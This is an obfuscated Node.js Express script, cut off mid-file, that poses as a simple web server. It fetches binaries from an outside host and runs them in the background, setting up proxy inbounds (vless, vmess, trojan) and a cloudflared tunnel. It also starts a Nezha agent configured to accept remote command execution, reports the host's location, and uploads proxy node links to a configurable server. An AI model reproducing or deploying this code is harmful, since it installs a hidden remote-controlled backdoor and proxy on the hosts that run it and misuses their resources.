const _0x9bc633=_0x3772;(function(_0x110682,_0xa24f2){const _0x144c95={_0x220dac:0x1db,_0x5d7e60:0x27a,_0x19c63e:0x207,_0x732623:0x205,_0x1f859a:0x1d8},_0x506faf=_0x3772,_0x41c70c=_0x110682();while(!![]){try{const _0x2edcfd=-parseInt(_0x506faf(0x230))/0x1*(parseInt(_0x506faf(_0x144c95._0x220dac))/0x2)+-parseInt(_0x506faf(_0x144c95._0x5d7e60))/0x3+parseInt(_0x506faf(0x244))/0x4*(parseInt(_0x506faf(_0x144c95._0x19c63e))/0x5)+parseInt(_0x506faf(_0x144c95._0x732623))/0x6+-parseInt(_0x506faf(0x236))/0x7*(parseInt(_0x506faf(0x24d))/0x8)+-parseInt(_0x506faf(0x1ee))/0x9*(parseInt(_0x506faf(0x20f))/0xa)+parseInt(_0x506faf(_0x144c95._0x1f859a))/0xb;if(_0x2edcfd===_0xa24f2)break;else _0x41c70c['push'](_0x41c70c['shift']());}catch(_0x22648d){_0x41c70c['push'](_0x41c70c['shift']());}}}(_0x5e89,0x7403c));const express=require('express'),app=express(),axios=require(_0x9bc633(0x1fd)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x9bc633(0x23e)),exec=promisify(require(_0x9bc633(0x256))[_0x9bc633(0x25e)]),{execSync}=require(_0x9bc633(0x256)),UPLOAD_URL=process[_0x9bc633(0x1c4)][_0x9bc633(0x238)]||'',PROJECT_URL=process[_0x9bc633(0x1c4)][_0x9bc633(0x211)]||'',AUTO_ACCESS=process[_0x9bc633(0x1c4)][_0x9bc633(0x255)]||![],FILE_PATH=process['env'][_0x9bc633(0x27c)]||_0x9bc633(0x1f9),SUB_PATH=process[_0x9bc633(0x1c4)]['SUB_PATH']||_0x9bc633(0x22f),PORT=process[_0x9bc633(0x1c4)]['SERVER_PORT']||process[_0x9bc633(0x1c4)]['PORT']||0xbb8,UUID=process['env'][_0x9bc633(0x251)]||_0x9bc633(0x252),NEZHA_SERVER=process[_0x9bc633(0x1c4)][_0x9bc633(0x20a)]||'',NEZHA_PORT=process[_0x9bc633(0x1c4)][_0x9bc633(0x254)]||'',NEZHA_KEY=process['env'][_0x9bc633(0x1e3)]||'',ARGO_DOMAIN=process[_0x9bc633(0x1c4)][_0x9bc633(0x271)]||_0x9bc633(0x243),ARGO_AUTH=process[_0x9bc633(0x1c4)][_0x9bc633(0x1eb)]||_0x9bc633(0x27f),ARGO_PORT=process[_0x9bc633(0x1c4)][_0x9bc633(0x1fc)]||0x1f41,CFIP=process[_0x9bc633(0x1c4)][_0x9bc633(0x1f3)]||_0x9bc633(0x1ce),CFPORT=process[_0x9bc633(0x1c4)][_0x9bc633(0x1e1)]||0x1bb,NAME=process[_0x9bc633(0x1c4)][_0x9bc633(0x24c)]||'';!fs[_0x9bc633(0x259)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console['log'](FILE_PATH+_0x9bc633(0x268))):console['log'](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x179362={_0xf9126f:0x26b},_0x39cf4a=_0x9bc633,_0x109f5d=_0x39cf4a(0x21a);let _0x32eaa6='';for(let _0x5fe7b7=0x0;_0x5fe7b7<0x6;_0x5fe7b7++){_0x32eaa6+=_0x109f5d[_0x39cf4a(0x209)](Math['floor'](Math['random']()*_0x109f5d[_0x39cf4a(_0x179362._0xf9126f)]));}return _0x32eaa6;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x9bc633(0x272)](FILE_PATH,npmName),phpPath=path[_0x9bc633(0x272)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x9bc633(0x272)](FILE_PATH,botName),subPath=path[_0x9bc633(0x272)](FILE_PATH,'sub.txt'),listPath=path[_0x9bc633(0x272)](FILE_PATH,_0x9bc633(0x1ca)),bootLogPath=path[_0x9bc633(0x272)](FILE_PATH,_0x9bc633(0x1e8)),configPath=path['join'](FILE_PATH,_0x9bc633(0x24a));function deleteNodes(){const _0x5205bd={_0x21c6eb:0x259,_0x347aab:0x231,_0x141d17:0x25b,_0x929281:0x1f1,_0x4df52c:0x231,_0x80be5a:0x200,_0x5ef117:0x221,_0x4a8116:0x1dd,_0x5d9b9b:0x24e},_0x1781d3=_0x9bc633;try{if(!UPLOAD_URL)return;if(!fs[_0x1781d3(_0x5205bd._0x21c6eb)](subPath))return;let _0x2d28c0;try{_0x2d28c0=fs['readFileSync'](subPath,_0x1781d3(_0x5205bd._0x347aab));}catch{return null;}const _0x307c7a=Buffer[_0x1781d3(_0x5205bd._0x141d17)](_0x2d28c0,_0x1781d3(_0x5205bd._0x929281))['toString'](_0x1781d3(_0x5205bd._0x4df52c)),_0x1bc820=_0x307c7a[_0x1781d3(_0x5205bd._0x80be5a)]('\x0a')[_0x1781d3(_0x5205bd._0x5ef117)](_0x120973=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1781d3(0x220)](_0x120973));if(_0x1bc820['length']===0x0)return;return axios[_0x1781d3(0x23d)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x1781d3(0x1e0)]({'nodes':_0x1bc820}),{'headers':{'Content-Type':_0x1781d3(_0x5205bd._0x4a8116)}})[_0x1781d3(_0x5205bd._0x5d9b9b)](_0xbb209e=>{return null;}),null;}catch(_0x3c63ec){return null;}}function _0x3772(_0x931039,_0xc297a1){const _0x5e89a0=_0x5e89();return _0x3772=function(_0x377296,_0x427dde){_0x377296=_0x377296-0x1bd;let _0x3a206a=_0x5e89a0[_0x377296];return _0x3a206a;},_0x3772(_0x931039,_0xc297a1);}function cleanupOldFiles(){const _0xf9c98c=_0x9bc633;try{const _0x3c3a7b=fs[_0xf9c98c(0x20e)](FILE_PATH);_0x3c3a7b[_0xf9c98c(0x22e)](_0x4a821f=>{const _0x291816=_0xf9c98c,_0x271095=path[_0x291816(0x272)](FILE_PATH,_0x4a821f);try{const _0x8fd05c=fs['statSync'](_0x271095);_0x8fd05c['isFile']()&&fs[_0x291816(0x276)](_0x271095);}catch(_0x2f561a){}});}catch(_0x28da0f){}}app[_0x9bc633(0x226)]('/',function(_0x367524,_0x133dbc){const _0x5a3f54={_0x164890:0x1d9},_0x265e99=_0x9bc633;_0x133dbc[_0x265e99(0x237)](_0x265e99(_0x5a3f54._0x164890));});async function generateConfig(){const _0x2a67f8={_0x5e86cd:0x248,_0x313425:0x246,_0x220aac:0x1d7,_0x164bda:0x25d,_0x4711cd:0x203,_0x1d291c:0x1c5,_0x4a8c00:0x246,_0x7c330f:0x246,_0x18d4b4:0x235,_0xef67d1:0x1dc,_0x4fe1d3:0x266,_0xc24a18:0x208,_0x3869a0:0x1dc,_0x711ddb:0x25d,_0x454f77:0x26e,_0x49f11f:0x260,_0xd00b5a:0x26c,_0x1b8925:0x213,_0x3d874a:0x263},_0x4270c0=_0x9bc633,_0x7a18be={'log':{'access':_0x4270c0(_0x2a67f8._0x5e86cd),'error':'/dev/null','loglevel':_0x4270c0(_0x2a67f8._0x313425)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x4270c0(0x203),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x4270c0(0x246),'fallbacks':[{'dest':0xbb9},{'path':_0x4270c0(_0x2a67f8._0x220aac),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x4270c0(_0x2a67f8._0x164bda),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x4270c0(0x1dc),'protocol':_0x4270c0(_0x2a67f8._0x4711cd),'settings':{'clients':[{'id':UUID}],'decryption':_0x4270c0(0x246)},'streamSettings':{'network':_0x4270c0(_0x2a67f8._0x1d291c),'security':_0x4270c0(_0x2a67f8._0x4a8c00)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x4270c0(0x203),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x4270c0(0x246)},'streamSettings':{'network':'ws','security':_0x4270c0(_0x2a67f8._0x7c330f),'wsSettings':{'path':_0x4270c0(0x1d7)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x4270c0(_0x2a67f8._0x18d4b4),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x4270c0(_0x2a67f8._0xef67d1),'protocol':_0x4270c0(_0x2a67f8._0x4fe1d3),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x4270c0(0x1d3)}},'sniffing':{'enabled':!![],'destOverride':[_0x4270c0(0x26e),_0x4270c0(0x235),_0x4270c0(_0x2a67f8._0xc24a18)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x4270c0(_0x2a67f8._0x3869a0),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x4270c0(0x246),'wsSettings':{'path':_0x4270c0(_0x2a67f8._0x711ddb)}},'sniffing':{'enabled':!![],'destOverride':[_0x4270c0(_0x2a67f8._0x454f77),_0x4270c0(0x235),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x4270c0(_0x2a67f8._0x49f11f)]},'outbounds':[{'protocol':_0x4270c0(_0x2a67f8._0xd00b5a),'tag':_0x4270c0(0x241)},{'protocol':_0x4270c0(_0x2a67f8._0x1b8925),'tag':_0x4270c0(_0x2a67f8._0x3d874a)}]};fs[_0x4270c0(0x26d)](path[_0x4270c0(0x272)](FILE_PATH,_0x4270c0(0x24a)),JSON[_0x4270c0(0x1e0)](_0x7a18be,null,0x2));}function getSystemArchitecture(){const _0x29ebb8={_0x5b0ed7:0x1d5},_0x163f79=_0x9bc633,_0x5ec4e9=os['arch']();return _0x5ec4e9===_0x163f79(0x21f)||_0x5ec4e9==='arm64'||_0x5ec4e9===_0x163f79(_0x29ebb8._0x5b0ed7)?_0x163f79(0x21f):'amd';}function downloadFile(_0x274162,_0x39468e,_0x585687){const _0x60dc18={_0x23e254:0x1ea,_0x9a9cf7:0x27b},_0x1933c8={_0x158d27:0x262,_0x588036:0x23a},_0x1b2fbf={_0x5ef665:0x1c0,_0x3fcea1:0x227,_0xf985d8:0x23a},_0x9eb446=_0x9bc633,_0x1d6da9=_0x274162;!fs[_0x9eb446(0x259)](FILE_PATH)&&fs[_0x9eb446(0x1cd)](FILE_PATH,{'recursive':!![]});const _0x147cd7=fs[_0x9eb446(0x1e9)](_0x1d6da9);axios({'method':_0x9eb446(0x226),'url':_0x39468e,'responseType':_0x9eb446(_0x60dc18._0x23e254)})[_0x9eb446(_0x60dc18._0x9a9cf7)](_0x5c7163=>{const _0x4d6f55={_0x46919e:0x1c3,_0x437712:0x1cf,_0x49f575:0x262,_0x4c9583:0x23a},_0x50b05a={_0x32eea0:0x1cc,_0x39abb8:0x1bd},_0x136800=_0x9eb446;_0x5c7163[_0x136800(_0x1b2fbf._0x5ef665)][_0x136800(0x267)](_0x147cd7),_0x147cd7['on'](_0x136800(_0x1b2fbf._0x3fcea1),()=>{const _0x39d0c3=_0x136800;_0x147cd7[_0x39d0c3(_0x50b05a._0x32eea0)](),console[_0x39d0c3(0x1f6)]('Download\x20'+path['basename'](_0x1d6da9)+_0x39d0c3(_0x50b05a._0x39abb8)),_0x585687(null,_0x1d6da9);}),_0x147cd7['on'](_0x136800(_0x1b2fbf._0xf985d8),_0x4a93ed=>{const _0x33e57e=_0x136800;fs[_0x33e57e(_0x4d6f55._0x46919e)](_0x1d6da9,()=>{});const _0x381728=_0x33e57e(0x240)+path['basename'](_0x1d6da9)+_0x33e57e(_0x4d6f55._0x437712)+_0x4a93ed[_0x33e57e(_0x4d6f55._0x49f575)];console[_0x33e57e(_0x4d6f55._0x4c9583)](_0x381728),_0x585687(_0x381728);});})[_0x9eb446(0x24e)](_0x1d51bc=>{const _0x19830d=_0x9eb446,_0x228549='Download\x20'+path['basename'](_0x1d6da9)+_0x19830d(0x1cf)+_0x1d51bc[_0x19830d(_0x1933c8._0x158d27)];console[_0x19830d(_0x1933c8._0x588036)](_0x228549),_0x585687(_0x228549);});}async function downloadFilesAndRun(){const _0x38833e={_0x16ffd9:0x26b,_0x398a20:0x1f6,_0x5c2ab8:0x1ed,_0x528755:0x1c1,_0x11a275:0x1e5,_0x1db08b:0x275,_0x4d3aa7:0x258,_0x53516f:0x245,_0x4f3068:0x210,_0x29bc0b:0x215,_0x1fda1b:0x25c,_0x4a3613:0x1f6,_0x7b18bb:0x228,_0x1fb7a7:0x26f,_0x48abe7:0x247,_0x55b038:0x278,_0x2423af:0x1d2,_0x4aeeea:0x1f6,_0x41dea5:0x274,_0x5b1508:0x257,_0x2a66ba:0x23a,_0x558227:0x273,_0x4a5e2d:0x259,_0x4425fc:0x277,_0x5f3e0d:0x1e6,_0x5cfce7:0x21e,_0x1cd1af:0x1f6,_0x46fe2c:0x269,_0x5ed3a9:0x26a},_0x56938d={_0x20ab37:0x22e},_0x670eca={_0x400fcb:0x23f},_0x4b0f47=_0x9bc633,_0x3540f3=getSystemArchitecture(),_0x1d2a25=getFilesForArchitecture(_0x3540f3);if(_0x1d2a25[_0x4b0f47(_0x38833e._0x16ffd9)]===0x0){console[_0x4b0f47(_0x38833e._0x398a20)](_0x4b0f47(_0x38833e._0x5c2ab8));return;}const _0x20f241=_0x1d2a25[_0x4b0f47(_0x38833e._0x528755)](_0x217947=>{const _0x9e7352={_0x1a693d:0x219};return new Promise((_0x573b4f,_0x306afe)=>{const _0x100054=_0x3772;downloadFile(_0x217947[_0x100054(0x25f)],_0x217947[_0x100054(_0x9e7352._0x1a693d)],(_0x422cd4,_0x47125e)=>{_0x422cd4?_0x306afe(_0x422cd4):_0x573b4f(_0x47125e);});});});try{await Promise[_0x4b0f47(0x23c)](_0x20f241);}catch(_0x4db3b6){console[_0x4b0f47(0x23a)](_0x4b0f47(0x279),_0x4db3b6);return;}function _0xdbea9f(_0x59ebbc){const _0x5074d4=_0x4b0f47,_0x471a04=0x1fd;_0x59ebbc[_0x5074d4(_0x56938d._0x20ab37)](_0x350248=>{const _0x19b671=_0x5074d4;fs[_0x19b671(0x259)](_0x350248)&&fs[_0x19b671(_0x670eca._0x400fcb)](_0x350248,_0x471a04,_0x435ad9=>{const _0x16c0ea=_0x19b671;_0x435ad9?console[_0x16c0ea(0x23a)](_0x16c0ea(0x261)+_0x350248+':\x20'+_0x435ad9):console[_0x16c0ea(0x1f6)](_0x16c0ea(0x225)+_0x350248+':\x20'+_0x471a04[_0x16c0ea(0x1f7)](0x8));});});}const _0x1cbf44=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0xdbea9f(_0x1cbf44);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2c730c=NEZHA_SERVER['includes'](':')?NEZHA_SERVER['split'](':')[_0x4b0f47(_0x38833e._0x11a275)]():'',_0x4e608f=new Set([_0x4b0f47(_0x38833e._0x1db08b),_0x4b0f47(_0x38833e._0x4d3aa7),'2096',_0x4b0f47(0x1da),_0x4b0f47(0x21d),_0x4b0f47(0x26f)]),_0x5bf8b3=_0x4e608f['has'](_0x2c730c)?'true':_0x4b0f47(_0x38833e._0x53516f),_0x28c753=_0x4b0f47(0x1fa)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x4b0f47(_0x38833e._0x4f3068)+_0x5bf8b3+_0x4b0f47(_0x38833e._0x29bc0b)+UUID;fs[_0x4b0f47(0x26d)](path['join'](FILE_PATH,_0x4b0f47(0x1f8)),_0x28c753);const _0x426ec5=_0x4b0f47(0x278)+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x4b0f47(_0x38833e._0x1fda1b);try{await exec(_0x426ec5),console[_0x4b0f47(_0x38833e._0x4a3613)](phpName+'\x20is\x20running'),await new Promise(_0x12aae5=>setTimeout(_0x12aae5,0x3e8));}catch(_0x20392a){console['error'](_0x4b0f47(_0x38833e._0x7b18bb)+_0x20392a);}}else{let _0x565aca='';const _0x550588=[_0x4b0f47(_0x38833e._0x1db08b),_0x4b0f47(0x258),_0x4b0f47(0x1ef),_0x4b0f47(0x1da),_0x4b0f47(0x21d),_0x4b0f47(_0x38833e._0x1fb7a7)];_0x550588[_0x4b0f47(0x1de)](NEZHA_PORT)&&(_0x565aca=_0x4b0f47(_0x38833e._0x48abe7));const _0x3483dd=_0x4b0f47(_0x38833e._0x55b038)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x4b0f47(_0x38833e._0x2423af)+NEZHA_KEY+'\x20'+_0x565aca+_0x4b0f47(0x1ec);try{await exec(_0x3483dd),console[_0x4b0f47(0x1f6)](npmName+'\x20is\x20running'),await new Promise(_0x5d12ac=>setTimeout(_0x5d12ac,0x3e8));}catch(_0x26bb76){console[_0x4b0f47(0x23a)]('npm\x20running\x20error:\x20'+_0x26bb76);}}}else console[_0x4b0f47(_0x38833e._0x4aeeea)](_0x4b0f47(_0x38833e._0x41dea5));const _0x48bf12=_0x4b0f47(0x278)+webPath+_0x4b0f47(_0x38833e._0x5b1508)+FILE_PATH+_0x4b0f47(0x234);try{await exec(_0x48bf12),console['log'](webName+'\x20is\x20running'),await new Promise(_0x5ab448=>setTimeout(_0x5ab448,0x3e8));}catch(_0x42e5a7){console[_0x4b0f47(_0x38833e._0x2a66ba)](_0x4b0f47(_0x38833e._0x558227)+_0x42e5a7);}if(fs[_0x4b0f47(_0x38833e._0x4a5e2d)](botPath)){let _0x27ee6c;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x27ee6c=_0x4b0f47(_0x38833e._0x4425fc)+ARGO_AUTH;else ARGO_AUTH[_0x4b0f47(0x1e2)](/TunnelSecret/)?_0x27ee6c='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x4b0f47(0x1f5):_0x27ee6c=_0x4b0f47(_0x38833e._0x5f3e0d)+FILE_PATH+_0x4b0f47(_0x38833e._0x5cfce7)+ARGO_PORT;try{await exec(_0x4b0f47(_0x38833e._0x55b038)+botPath+'\x20'+_0x27ee6c+'\x20>/dev/null\x202>&1\x20&'),console[_0x4b0f47(_0x38833e._0x1cd1af)](botName+_0x4b0f47(_0x38833e._0x46fe2c)),await new Promise(_0x493eb5=>setTimeout(_0x493eb5,0x7d0));}catch(_0x230cc2){console[_0x4b0f47(0x23a)](_0x4b0f47(_0x38833e._0x5ed3a9)+_0x230cc2);}}await new Promise(_0x15b714=>setTimeout(_0x15b714,0x1388));}function getFilesForArchitecture(_0x65ae43){const _0x54b062={_0x5656fb:0x21f,_0x482561:0x22d,_0x40374e:0x1df,_0x4ad48d:0x270},_0x1a1168=_0x9bc633;let _0x170441;_0x65ae43===_0x1a1168(_0x54b062._0x5656fb)?_0x170441=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x1a1168(0x249)}]:_0x170441=[{'fileName':webPath,'fileUrl':_0x1a1168(0x1d0)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x248853=_0x65ae43===_0x1a1168(0x21f)?_0x1a1168(_0x54b062._0x482561):_0x1a1168(_0x54b062._0x40374e);_0x170441['unshift']({'fileName':npmPath,'fileUrl':_0x248853});}else{const _0x4bf686=_0x65ae43===_0x1a1168(_0x54b062._0x5656fb)?_0x1a1168(_0x54b062._0x4ad48d):_0x1a1168(0x202);_0x170441['unshift']({'fileName':phpPath,'fileUrl':_0x4bf686});}}return _0x170441;}function argoType(){const _0x1e213f={_0x58a54e:0x1f6,_0x192200:0x1de,_0x16079d:0x22b,_0x2ecbeb:0x26d,_0x1a4ede:0x272,_0x12d889:0x264,_0x544c65:0x200,_0x25407f:0x264,_0x4f59a1:0x1f4,_0x4de178:0x1c9,_0x10b0f9:0x26d},_0x18f8ec=_0x9bc633;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x18f8ec(_0x1e213f._0x58a54e)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x18f8ec(_0x1e213f._0x192200)](_0x18f8ec(_0x1e213f._0x16079d))){fs[_0x18f8ec(_0x1e213f._0x2ecbeb)](path[_0x18f8ec(_0x1e213f._0x1a4ede)](FILE_PATH,_0x18f8ec(_0x1e213f._0x12d889)),ARGO_AUTH);const _0x2e4cad='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x18f8ec(_0x1e213f._0x544c65)]('\x22')[0xb]+_0x18f8ec(0x201)+path[_0x18f8ec(_0x1e213f._0x1a4ede)](FILE_PATH,_0x18f8ec(_0x1e213f._0x25407f))+_0x18f8ec(_0x1e213f._0x4f59a1)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x18f8ec(_0x1e213f._0x4de178);fs[_0x18f8ec(_0x1e213f._0x10b0f9)](path[_0x18f8ec(_0x1e213f._0x1a4ede)](FILE_PATH,_0x18f8ec(0x223)),_0x2e4cad);}else console['log']('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}async function extractDomains(){const _0x3e669c={_0x4d1ffa:0x200,_0x500bba:0x22e,_0x186c24:0x232,_0x52a850:0x1f6,_0x389e0f:0x1e8,_0x1a2f16:0x21e,_0x541099:0x23a,_0x2f8ada:0x23a,_0x503011:0x20b},_0x5a96cb={_0x4ab1f7:0x1c0,_0x5e654a:0x24f,_0x584c11:0x1c0,_0x599cd4:0x1e4},_0x105bfa={_0x468bb0:0x253,_0x3c1b95:0x1bf,_0x153ba7:0x27d,_0xcdc698:0x212},_0x5c2b6b=_0x9bc633;let _0x33f47d;if(ARGO_AUTH&&ARGO_DOMAIN)_0x33f47d=ARGO_DOMAIN,console['log'](_0x5c2b6b(0x24b),_0x33f47d),await _0xe44575(_0x33f47d);else try{const _0x48c617=fs[_0x5c2b6b(0x229)](path[_0x5c2b6b(0x272)](FILE_PATH,_0x5c2b6b(0x1e8)),_0x5c2b6b(0x231)),_0x2ae6fd=_0x48c617[_0x5c2b6b(_0x3e669c._0x4d1ffa)]('\x0a'),_0x50d9ff=[];_0x2ae6fd[_0x5c2b6b(_0x3e669c._0x500bba)](_0xb1b3bf=>{const _0x26c6aa=_0xb1b3bf['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x26c6aa){const _0x1718e0=_0x26c6aa[0x1];_0x50d9ff['push'](_0x1718e0);}});if(_0x50d9ff[_0x5c2b6b(0x26b)]>0x0)_0x33f47d=_0x50d9ff[0x0],console['log'](_0x5c2b6b(_0x3e669c._0x186c24),_0x33f47d),await _0xe44575(_0x33f47d);else{console[_0x5c2b6b(_0x3e669c._0x52a850)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs['unlinkSync'](path[_0x5c2b6b(0x272)](FILE_PATH,_0x5c2b6b(_0x3e669c._0x389e0f)));async function _0xf2ad6(){const _0x148aa9=_0x5c2b6b;try{process[_0x148aa9(0x1ff)]==='win32'?await exec(_0x148aa9(_0x105bfa._0x468bb0)+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x148aa9(_0x105bfa._0x3c1b95)+botName[_0x148aa9(0x209)](0x0)+']'+botName[_0x148aa9(_0x105bfa._0x153ba7)](0x1)+_0x148aa9(_0x105bfa._0xcdc698));}catch(_0x4dcdd2){}}_0xf2ad6(),await new Promise(_0x463ce9=>setTimeout(_0x463ce9,0xbb8));const _0x44c37e='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x5c2b6b(_0x3e669c._0x1a2f16)+ARGO_PORT;try{await exec(_0x5c2b6b(0x278)+botPath+'\x20'+_0x44c37e+_0x5c2b6b(0x25a)),console['log'](botName+_0x5c2b6b(0x269)),await new Promise(_0x24d9e3=>setTimeout(_0x24d9e3,0xbb8)),await extractDomains();}catch(_0x4641f2){console[_0x5c2b6b(_0x3e669c._0x541099)](_0x5c2b6b(0x26a)+_0x4641f2);}}}catch(_0x53b70f){console[_0x5c2b6b(_0x3e669c._0x2f8ada)](_0x5c2b6b(_0x3e669c._0x503011),_0x53b70f);}async function _0x5a6c91(){const _0x5ed00b=_0x5c2b6b;try{const _0x4eced4=await axios['get'](_0x5ed00b(0x1fe),{'timeout':0xbb8});if(_0x4eced4[_0x5ed00b(_0x5a96cb._0x4ab1f7)]&&_0x4eced4[_0x5ed00b(0x1c0)][_0x5ed00b(0x233)]&&_0x4eced4[_0x5ed00b(0x1c0)][_0x5ed00b(0x1d6)])return _0x4eced4[_0x5ed00b(0x1c0)]['country_code']+'_'+_0x4eced4['data']['org'];}catch(_0x218dc4){try{const _0x386b7e=await axios['get'](_0x5ed00b(0x224),{'timeout':0xbb8});if(_0x386b7e[_0x5ed00b(_0x5a96cb._0x4ab1f7)]&&_0x386b7e[_0x5ed00b(0x1c0)][_0x5ed00b(_0x5a96cb._0x5e654a)]===_0x5ed00b(0x1c7)&&_0x386b7e[_0x5ed00b(_0x5a96cb._0x584c11)][_0x5ed00b(0x1e4)]&&_0x386b7e['data'][_0x5ed00b(0x1d6)])return _0x386b7e['data'][_0x5ed00b(_0x5a96cb._0x599cd4)]+'_'+_0x386b7e['data'][_0x5ed00b(0x1d6)];}catch(_0x2ee66e){}}return _0x5ed00b(0x217);}async function _0xe44575(_0xf143b3){const _0x4f47c3={_0x950b02:0x1f2,_0x48c456:0x265,_0xffe338:0x1be,_0x3b7732:0x1f1,_0x368b19:0x1f7,_0x44f35e:0x1f1,_0x2712be:0x1f6,_0x309f3e:0x21c,_0x59f8b0:0x226},_0x1b7a35=await _0x5a6c91(),_0x28d32a=NAME?NAME+'-'+_0x1b7a35:_0x1b7a35;return new Promise(_0x8f845a=>{setTimeout(()=>{const _0x4f8426={_0x42ea67:0x25b,_0x3a8946:0x216,_0x1071bc:0x218,_0x37cde3:0x237},_0x5317f8=_0x3772,_0xe3fda5={'v':'2','ps':''+_0x28d32a,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x5317f8(0x246),'net':'ws','type':'none','host':_0xf143b3,'path':_0x5317f8(0x1c8),'tls':'tls','sni':_0xf143b3,'alpn':'','fp':_0x5317f8(_0x4f47c3._0x950b02)},_0x39d0bc='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x5317f8(_0x4f47c3._0x48c456)+_0xf143b3+_0x5317f8(_0x4f47c3._0xffe338)+_0xf143b3+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x28d32a+_0x5317f8(0x1cb)+Buffer[_0x5317f8(0x25b)](JSON['stringify'](_0xe3fda5))['toString'](_0x5317f8(_0x4f47c3._0x3b7732))+_0x5317f8(0x1e7)+UUID+'@'+CFIP+':'+CFPORT+_0x5317f8(0x222)+_0xf143b3+_0x5317f8(0x1be)+_0xf143b3+_0x5317f8(0x23b)+_0x28d32a+_0x5317f8(0x1f0);console[_0x5317f8(0x1f6)](Buffer[_0x5317f8(0x25b)](_0x39d0bc)[_0x5317f8(0x1f7)](_0x5317f8(0x1f1))),fs['writeFileSync'](subPath,Buffer[_0x5317f8(0x25b)](_0x39d0bc)[_0x5317f8(_0x4f47c3._0x368b19)](_0x5317f8(_0x4f47c3._0x44f35e))),console[_0x5317f8(_0x4f47c3._0x2712be)](FILE_PATH+_0x5317f8(_0x4f47c3._0x309f3e)),uploadNodes(),app[_0x5317f8(_0x4f47c3._0x59f8b0)]('/'+SUB_PATH,(_0x283445,_0x316335)=>{const _0x4efd5a=_0x5317f8,_0x10f1e3=Buffer[_0x4efd5a(_0x4f8426._0x42ea67)](_0x39d0bc)[_0x4efd5a(0x1f7)]('base64');_0x316335['set'](_0x4efd5a(_0x4f8426._0x3a8946),_0x4efd5a(_0x4f8426._0x1071bc)),_0x316335[_0x4efd5a(_0x4f8426._0x37cde3)](_0x10f1e3);}),_0x8f845a(_0x39d0bc);},0x7d0);});}}function _0x5e89(){const _0x2c0242=['tunnel.yml','http://ip-api.com/json/','Empowerment\x20success\x20for\x20','get','finish','php\x20running\x20error:\x20','readFileSync','response','TunnelSecret','listen','https://arm64.ssss.nyc.mn/agent','forEach','kissy','501191FOLKPg','utf-8','ArgoDomain:','country_code','/config.json\x20>/dev/null\x202>&1\x20&','tls','1689814wuzaHl','send','UPLOAD_URL','rm\x20-rf\x20','error','&path=%2Ftrojan-argo%3Fed%3D2560#','all','post','util','chmod','Download\x20','direct','Unhandled\x20error\x20in\x20startserver:','only.lovey.de5.net','4rmUOQk','false','none','--tls','/dev/null','https://arm64.ssss.nyc.mn/bot','config.json','ARGO_DOMAIN:','NAME','24Nlsjdo','catch','status','Error\x20in\x20startserver:','UUID','a3305a90-2670-40f9-ac86-5b4a5b9451d7','taskkill\x20/f\x20/im\x20','NEZHA_PORT','AUTO_ACCESS','child_process','\x20-c\x20','8443','existsSync','\x20>/dev/null\x202>&1\x20&','from','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','/trojan-argo','exec','fileName','https+local://8.8.8.8/dns-query','Empowerment\x20failed\x20for\x20','message','block','tunnel.json','?encryption=none&security=tls&sni=','vmess','pipe','\x20is\x20created','\x20is\x20running','Error\x20executing\x20command:\x20','length','freedom','writeFileSync','http','2053','https://arm64.ssss.nyc.mn/